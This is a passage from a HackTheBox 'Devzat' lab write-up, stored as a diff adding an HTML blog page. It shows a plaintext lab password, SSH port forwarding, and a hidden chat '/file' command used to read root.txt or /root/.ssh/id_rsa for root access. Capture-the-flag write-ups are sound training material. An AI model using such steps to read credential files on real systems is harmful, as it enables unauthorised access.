+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/devzat/20220311163816.png"
+        data-srcset="/assets/images/devzat/20220311163816.png, /assets/images/devzat/20220311163816.png 1.5x, /assets/images/devzat/20220311163816.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/devzat/20220311163816.png"
+        title="image" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/devzat/20220311164104.png"
+        data-srcset="/assets/images/devzat/20220311164104.png, /assets/images/devzat/20220311164104.png 1.5x, /assets/images/devzat/20220311164104.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/devzat/20220311164104.png"
+        title="image" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/devzat/20220311164145.png"
+        data-srcset="/assets/images/devzat/20220311164145.png, /assets/images/devzat/20220311164145.png 1.5x, /assets/images/devzat/20220311164145.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/devzat/20220311164145.png"
+        title="image" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/devzat/20220311164415.png"
+        data-srcset="/assets/images/devzat/20220311164415.png, /assets/images/devzat/20220311164415.png 1.5x, /assets/images/devzat/20220311164415.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/devzat/20220311164415.png"
+        title="image" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/devzat/20220311165802.png"
+        data-srcset="/assets/images/devzat/20220311165802.png, /assets/images/devzat/20220311165802.png 1.5x, /assets/images/devzat/20220311165802.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/devzat/20220311165802.png"
+        title="image" /></p>
+<p>and we can see the user <strong>catherine</strong> shows up with this password : <code>woBeeYareedahc7Oogeephies7Aiseci</code></p>
+<p>now we can switch to user <strong>catherine</strong> easily :</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/devzat/20220311170147.png"
+        data-srcset="/assets/images/devzat/20220311170147.png, /assets/images/devzat/20220311170147.png 1.5x, /assets/images/devzat/20220311170147.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/devzat/20220311170147.png"
+        title="image" /></p>
+<h1 id="root-access">Root access:</h1>
+<p>now as we are logged in as the user <strong>catherine</strong> we can check the <code>/var/backups</code> which we can&rsquo;t access earlier.</p>
+<p>download them at our machine first :</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/devzat/20220311170412.png"
+        data-srcset="/assets/images/devzat/20220311170412.png, /assets/images/devzat/20220311170412.png 1.5x, /assets/images/devzat/20220311170412.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/devzat/20220311170412.png"
+        title="image" /></p>
+<p>after we unzip them we can see they have exact same files , so we can check if there are any difference between the content</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">diff main/commands.go dev/commands.go</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/devzat/20220311171227.png"
+        data-srcset="/assets/images/devzat/20220311171227.png, /assets/images/devzat/20220311171227.png 1.5x, /assets/images/devzat/20220311171227.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/devzat/20220311171227.png"
+        title="image" /></p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-go">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="w"> 	</span><span class="nx">commands</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="p">[]</span><span class="nx">commandInfo</span><span class="p">{</span><span class="nx">clear</span><span class="p">,</span><span class="w"> </span><span class="nx">message</span><span class="p">,</span><span class="w"> </span><span class="nx">users</span><span class="p">,</span><span class="w"> </span><span class="nx">all</span><span class="p">,</span><span class="w"> </span><span class="nx">exit</span><span class="p">,</span><span class="w"> </span><span class="nx">bell</span><span class="p">,</span><span class="w"> </span><span class="nx">room</span><span class="p">,</span><span class="w"> </span><span class="nx">kick</span><span class="p">,</span><span class="w"> </span><span class="nx">id</span><span class="p">,</span><span class="w"> </span><span class="nx">_commands</span><span class="p">,</span><span class="w"> </span><span class="nx">nick</span><span class="p">,</span><span class="w"> </span><span class="nx">color</span><span class="p">,</span><span class="w"> </span><span class="nx">timezone</span><span class="p">,</span><span class="w"> </span><span class="nx">emojis</span><span class="p">,</span><span class="w"> </span><span class="nx">help</span><span class="p">,</span><span class="w"> </span><span class="nx">tictactoe</span><span class="p">,</span><span class="w"> </span><span class="nx">hangman</span><span class="p">,</span><span class="w"> </span><span class="nx">shrug</span><span class="p">,</span><span class="w"> </span><span class="nx">asciiArt</span><span class="p">,</span><span class="w"> </span><span class="nx">exampleCode</span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">---</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">&gt;</span><span class="w"> 	</span><span class="nx">commands</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="p">[]</span><span class="nx">commandInfo</span><span class="p">{</span><span class="nx">clear</span><span class="p">,</span><span class="w"> </span><span class="nx">message</span><span class="p">,</span><span class="w"> </span><span class="nx">users</span><span class="p">,</span><span class="w"> </span><span class="nx">all</span><span class="p">,</span><span class="w"> </span><span class="nx">exit</span><span class="p">,</span><span class="w"> </span><span class="nx">bell</span><span class="p">,</span><span class="w"> </span><span class="nx">room</span><span class="p">,</span><span class="w"> </span><span class="nx">kick</span><span class="p">,</span><span class="w"> </span><span class="nx">id</span><span class="p">,</span><span class="w"> </span><span class="nx">_commands</span><span class="p">,</span><span class="w"> </span><span class="nx">nick</span><span class="p">,</span><span class="w"> </span><span class="nx">color</span><span class="p">,</span><span class="w"> </span><span class="nx">timezone</span><span class="p">,</span><span class="w"> </span><span class="nx">emojis</span><span class="p">,</span><span class="w"> </span><span class="nx">help</span><span class="p">,</span><span class="w"> </span><span class="nx">tictactoe</span><span class="p">,</span><span class="w"> </span><span class="nx">hangman</span><span class="p">,</span><span class="w"> </span><span class="nx">shrug</span><span class="p">,</span><span class="w"> </span><span class="nx">asciiArt</span><span class="p">,</span><span class="w"> </span><span class="nx">exampleCode</span><span class="p">,</span><span class="w"> </span><span class="nx">file</span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">&gt;</span><span class="w"> </span><span class="p">}</span></span></span></code></pre></div></div>
+<p>and we can the option <strong>&ldquo;file&rdquo;</strong> , if we read the source code we will find :</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">file</span> <span class="o">=</span> commandInfo<span class="o">{</span><span class="s2">&#34;file&#34;</span>, <span class="s2">&#34;Paste a files content directly to chat [alpha]&#34;</span>, fileCommand, 1, false, nil<span class="o">}</span></span></span></code></pre></div></div>
+<p>and will find :</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/devzat/20220311172609.png"
+        data-srcset="/assets/images/devzat/20220311172609.png, /assets/images/devzat/20220311172609.png 1.5x, /assets/images/devzat/20220311172609.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/devzat/20220311172609.png"
+        title="image" /></p>
+<p>but if we tried the connection command will see the command <strong>/file</strong> doesn&rsquo;t exist :(</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ssh -l mesbah devzat.htb -p <span class="m">8000</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/devzat/20220311172636.png"
+        data-srcset="/assets/images/devzat/20220311172636.png, /assets/images/devzat/20220311172636.png 1.5x, /assets/images/devzat/20220311172636.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/devzat/20220311172636.png"
+        title="image" /></p>
+<p>we can read other codes under the <strong>dev</strong> file we have and will find at <strong>&ldquo;devchat.go&rdquo;</strong></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/devzat/20220311172810.png"
+        data-srcset="/assets/images/devzat/20220311172810.png, /assets/images/devzat/20220311172810.png 1.5x, /assets/images/devzat/20220311172810.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/devzat/20220311172810.png"
+        title="image" /></p>
+<p>this port is running locally we can forward it then connect to the bot :</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># at your side :</span>
+</span></span><span class="line"><span class="cl">ssh -i devzat  -L 8443:127.0.0.1:8443 -N patrick@devzat.htb</span></span></code></pre></div></div>
+<p>then connect to the bot :</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ssh -l mesbah 127.0.0.1 -p <span class="m">8443</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/devzat/20220311173041.png"
+        data-srcset="/assets/images/devzat/20220311173041.png, /assets/images/devzat/20220311173041.png 1.5x, /assets/images/devzat/20220311173041.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/devzat/20220311173041.png"
+        title="image" /></p>
+<p>now we can read the <strong>root.txt</strong> , or we can read the <strong>/root/.ssh/id_rsa</strong> to gain the root access</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/devzat/20220311173249.png"
+        data-srcset="/assets/images/devzat/20220311173249.png, /assets/images/devzat/20220311173249.png 1.5x, /assets/images/devzat/20220311173249.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/devzat/20220311173249.png"
+        title="image" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/devzat/20220311173315.png"
+        data-srcset="/assets/images/devzat/20220311173315.png, /assets/images/devzat/20220311173315.png 1.5x, /assets/images/devzat/20220311173315.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/devzat/20220311173315.png"
+        title="image" /></p>
+<h2 id="pwned">Pwned</h2>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://media.giphy.com/assets/images/DhstvI3zZ598Nb1rFf/giphy-downsized-large.gif"
+        data-srcset="https://media.giphy.com/assets/images/DhstvI3zZ598Nb1rFf/giphy-downsized-large.gif, https://media.giphy.com/assets/images/DhstvI3zZ598Nb1rFf/giphy-downsized-large.gif 1.5x, https://media.giphy.com/assets/images/DhstvI3zZ598Nb1rFf/giphy-downsized-large.gif 2x"
+        data-sizes="auto"
+        alt="https://media.giphy.com/assets/images/DhstvI3zZ598Nb1rFf/giphy-downsized-large.gif"
+        title="Alt Text" /></p></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2022-03-11</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on X" data-sharer="x" data-url="http://example.org/posts/linux-machines/2022-03-11-devzat/" data-title="Devzat Hackthebox writeup" data-via="tinkerhell1337" data-hashtags="Hackthebox,rce,Port forwarding"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://example.org/posts/linux-machines/2022-03-11-devzat/" data-hashtag="Hackthebox"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="http://example.org/posts/linux-machines/2022-03-11-devzat/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a><a href="https://t.me/share/url?url=http%3a%2f%2fexample.org%2fposts%2flinux-machines%2f2022-03-11-devzat%2f&amp;text=Devzat%20Hackthebox%20writeup" target="_blank" title="Share on Telegram"><i class="fab fa-telegram fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/hackthebox/">Hackthebox</a>,&nbsp;<a href="/tags/rce/">Rce</a>,&nbsp;<a href="/tags/port-forwarding/">Port-Forwarding</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/windows-machines/2022-02-25-driver/" class="prev" rel="prev" title="Driver Hackthebox writeup"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Driver Hackthebox writeup</a>
+            <a href="/posts/linux-machines/2022-03-26-secret/" class="next" rel="next" title="Secret Hackthebox writeup">Secret Hackthebox writeup<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.150.1">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.3.1-DEV"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">0xMesbaha</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a>
+        </div>
+
+        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><script src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.2/sharer.min.js"></script><script>window.config={"comment":{}};</script><script src="/js/theme.min.js"></script></body>
+</html>
